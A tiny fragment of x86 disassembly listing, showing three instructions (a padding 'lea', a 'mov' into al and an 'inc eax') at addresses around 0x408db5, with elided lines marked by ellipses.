  408db5:	lea    eax,[eax+0x0]
	...
  408dc4:	mov    al,0x8d
  408dc6:	inc    eax
	...
